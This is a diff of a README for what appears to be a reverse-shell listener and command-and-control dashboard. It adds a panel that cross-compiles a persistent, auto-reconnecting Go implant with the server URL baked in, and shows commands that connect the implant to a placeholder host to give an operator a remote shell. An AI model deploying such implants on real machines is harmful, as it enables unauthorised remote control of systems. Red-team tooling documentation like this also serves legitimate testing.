@@ -12,8 +12,9 @@ A single-host, multi-transport reverse-shell catcher with a browser dashboard.
   - TLS reverse-shell listener
   - HTTP webshell beacon transport
   - multiplexed WebSocket/protobuf implant protocol with a Go client
-- **Dashboard:** live session list with a full PTY terminal (resize + mouse support).
+- **Dashboard:** live session list with a full PTY terminal (resize + mouse support), one-click offline-session cleanup.
 - **Auth:** session-cookie login; protects the dashboard, REST API, and browser-facing WebSocket endpoints.
+- **Build panel:** cross-compile the Go mux client from the dashboard with the server URL baked in — supports linux/darwin/windows × amd64/arm64, plus armv7 (Luckfox/Shark Jack) and mipsle soft-float (MT7628).
 
 ![Screenshot](https://raw.githubusercontent.com/nemanjan00/reverse-shell-listener/master/screenshot/screenshot.png)
 
@@ -118,9 +119,25 @@ RSL_SERVER=ws://YOUR_HOST:8080/mux ./rsl-client
 
 The Go client opens a persistent WebSocket, reports hostname/user/OS/arch, and
 spawns a real PTY for each channel the operator requests from the dashboard.
-Resize events from xterm are forwarded to the remote PTY via `SIGWINCH`.
+Resize events from xterm are forwarded to the remote PTY via `SIGWINCH`. On
+disconnect it reconnects with linear backoff.
 
-## Cross-compiling the Go client
+### Building the client from the dashboard
+
+The dashboard's **Build client** panel (sidebar, bottom) cross-compiles the
+Go client on the server and downloads the binary with the server URL and tags
+baked in via `-ldflags -X`, so the downloaded client just runs with no args:
+
+```bash
+./rsl-client            # uses the baked-in server URL + tags
+RSL_SERVER=ws://other:8080/mux ./rsl-client   # override at runtime
+```
+
+Available targets: `linux-amd64`, `linux-arm64`, `linux-arm-7`,
+`linux-mips-softfloat`, `linux-mipsle-softfloat`, `linux-386`,
+`darwin-arm64`, `darwin-amd64`, `windows-amd64`, `windows-arm64`.
+
+## Cross-compiling the Go client manually
 
 ```bash
 cd client
